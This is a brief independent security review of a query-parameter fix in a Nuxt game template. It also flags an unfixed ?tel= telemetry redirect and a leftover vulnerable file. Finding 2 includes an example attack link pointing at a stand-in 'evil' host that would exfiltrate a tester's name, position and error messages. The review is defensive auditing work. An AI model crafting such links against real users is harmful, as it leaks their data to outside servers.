# Independent review: world.esh27.com security fix (codesandbox-template-nuxt @ fix-acct-c2, bb919eb), 2026-11-24

Read-only review from the Interior lab session. Nothing was merged or deployed.

1. **The ?acct= fix is correct.**
   - The API URL is taken from ?acct= only when the page itself is on localhost/127.0.0.1 and the value is a local http(s) URL.
   - Profile ids are now escaped. `esc` covers & < > " '.
   - Colors are restricted to #rrggbb.
   - It is applied to both loaded copies (integration/world, preview/world).
2. **Same class, not fixed: `?tel=` in `twin/integration/world/adapters/62-telemetry.js:9`.**
   - Any link with `?p=<name>&tel=https://evil` sends the tester's name, in-game position, speed, FPS and JS error messages to an
     arbitrary server every 15 s.
   - No credentials are sent, so the severity is low. The fix is the same pattern as acct (accept only localhost).
3. **A stale vulnerable copy remains:** `twin/integration/adapters/60-account.js:8` still has the old line.
   - No HTML in the tree loads it (only `world/adapters/` is referenced), so it is dead code.
   - Recommendation: delete it, so that a future copy/merge cannot reintroduce the bug.
4. I found no other query parameter that redirects network traffic (searched for `.get('…') ||` and WebSocket/EventSource).
